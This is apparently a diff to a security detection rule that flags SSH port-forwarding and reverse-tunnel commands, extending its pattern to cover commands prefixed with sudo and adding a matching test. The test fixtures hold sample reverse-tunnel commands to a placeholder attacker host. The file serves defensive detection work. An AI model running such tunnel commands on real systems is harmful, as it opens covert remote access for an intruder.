@@ -22,7 +22,7 @@ taxonomy:
 
 match: >
   e.event.action == "command.executed" && (
-    e.command.command.matches("(?i)(^|[;&|]\\s*)\\s*(ssh|scp|sftp)\\b\\s+(-(R|L)\\s*\\d+:|-D\\s*\\d+\\b|--remote-forward\\b|--local-forward\\b|--dynamic\\b)")
+    e.command.command.matches("(?i)(^|[;&|]\\s*|\\bsudo\\s+)\\s*(ssh|scp|sftp)\\b\\s+(-(R|L)\\s*\\d+:|-D\\s*\\d+\\b|--remote-forward\\b|--local-forward\\b|--dynamic\\b)")
   )
 
 emit:
@@ -52,6 +52,12 @@ tests:
     events:
       - event: { action: command.executed }
         command: { command: "ssh --remote-forward 8080:localhost:80 user@attacker" }
+        session: { id: s1 }
+  - name: sudo_ssh_reverse_tunnel
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "sudo ssh -R 8080:localhost:80 user@attacker.example" }
         session: { id: s1 }
   - name: ordinary_ssh_login
     verdict: no_match
